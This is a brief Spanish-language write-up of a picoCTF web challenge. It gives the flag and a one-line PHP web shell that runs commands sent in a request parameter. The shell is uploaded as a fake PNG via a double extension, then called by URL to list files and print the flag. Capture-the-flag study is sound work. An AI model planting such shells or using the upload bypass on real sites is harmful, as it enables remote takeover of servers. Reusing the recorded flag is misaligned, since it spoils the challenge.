#Reto 
## Descripcion del reto
I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.
## Solucion
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
creamos un script y lo modificamos para poder subirlo como png
![[Pasted image 20250930194347.png]]
este es el script q usamos
````
<?php
if(isset($_REQUEST['cmd'])) 
    system($_REQUEST['cmd']);
?>
`````
lo subimos como png
despues cambiamos el directorio y ponemos esto 
http://atlas.picoctf.net:52124/uploads/webshell.png.php?cmd=ls%20..
nos lleva a aqui y nos muestra este archivo
![[Pasted image 20250930194942.png]]
ahora cambiamos la url otra vez pero poniendo esto
http://atlas.picoctf.net:52124/uploads/webshell.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt
y aqui esta la llave
![[Pasted image 20250930195029.png]]
## Notas

## Referencias

